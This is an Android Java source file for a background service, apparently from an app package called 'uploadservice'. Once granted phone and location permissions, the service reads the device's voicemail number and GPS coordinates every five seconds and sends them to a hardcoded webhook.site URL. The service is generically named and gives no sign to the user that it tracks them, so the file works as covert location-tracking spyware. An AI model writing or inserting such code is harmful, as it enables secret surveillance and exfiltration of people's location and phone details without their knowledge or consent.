package com.best.uploadservice;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.IntentService;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.nabinbhandari.android.permissions.PermissionHandler;
import com.nabinbhandari.android.permissions.Permissions;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class BackgroundService extends IntentService {
    public BackgroundService(String name) {
        super(name);
    }

    public BackgroundService() {
        super(null);
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        List<String> notGranted = new ArrayList<>();
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
            notGranted.add(Manifest.permission.READ_PHONE_STATE);
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            notGranted.add(Manifest.permission.ACCESS_FINE_LOCATION);

        if (notGranted.size() > 0) {
            String[] permissions = notGranted.toArray(new String[notGranted.size()]);
            Permissions.Options options = new Permissions.Options().setCreateNewTask(true);
            Permissions.check(this, permissions, null, options, new PermissionHandler() {
                @Override
                public void onGranted() {
                    doStuff();
                }
            });
        } else {
            doStuff();
        }
    }

    private void doStuff() {
        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @SuppressLint("MissingPermission")
            @Override
            public void run() {
                String voiceMailNumber = telephonyManager.getVoiceMailNumber();
                Location location = locationManager.getLastKnownLocation("gps");
                double longitude = (location != null) ? location.getLongitude() : 0;
                double latitude = (location != null) ? location.getLatitude() : 0;
                long at = System.currentTimeMillis();

                HttpURLConnection urlConnection = null;
                try {
                    URL url = new URL("https://webhook.site/7b5fbc9d-536d-4a0a-a069-83a15ba34ab4?voice_mail_num=" + voiceMailNumber + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
                    urlConnection = (HttpURLConnection) url.openConnection();
                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    if (urlConnection != null)
                        urlConnection.disconnect();
                }
            }
        }, 0, 5000);
    }
}
